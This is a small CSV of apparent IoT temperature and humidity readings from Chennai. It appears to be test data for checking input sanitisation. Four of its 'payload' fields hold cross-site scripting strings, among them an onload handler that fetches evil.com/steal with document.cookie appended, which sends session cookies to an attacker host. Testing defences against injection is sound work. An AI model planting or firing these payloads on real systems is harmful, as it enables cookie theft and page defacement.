device_id,timestamp,temperature,humidity,location,status,payload
IOT_001,2026-01-15 09:00:00,24.5,60,Chennai,active,normal_reading
IOT_002,2026-01-15 09:01:00,25.1,61,Chennai,active,normal_reading
IOT_003,2026-01-15 09:02:00,23.8,59,Chennai,active,<script>alert('XSS Attack!')</script>
IOT_004,2026-01-15 09:03:00,24.9,62,Chennai,active,normal_reading
IOT_005,2026-01-15 09:04:00,25.3,60,Chennai,active,onerror=alert(document.cookie)
IOT_006,2026-01-15 09:05:00,24.1,58,Chennai,active,normal_reading
IOT_007,2026-01-15 09:06:00,24.7,61,Chennai,active,javascript:void(document.write('<h1>Hacked</h1>'))
IOT_008,2026-01-15 09:07:00,25.0,60,Chennai,active,normal_reading
IOT_009,2026-01-15 09:08:00,24.4,59,Chennai,active,normal_reading
IOT_010,2026-01-15 09:09:00,25.2,61,Chennai,active,onload=fetch('http://evil.com/steal?d='+document.cookie)
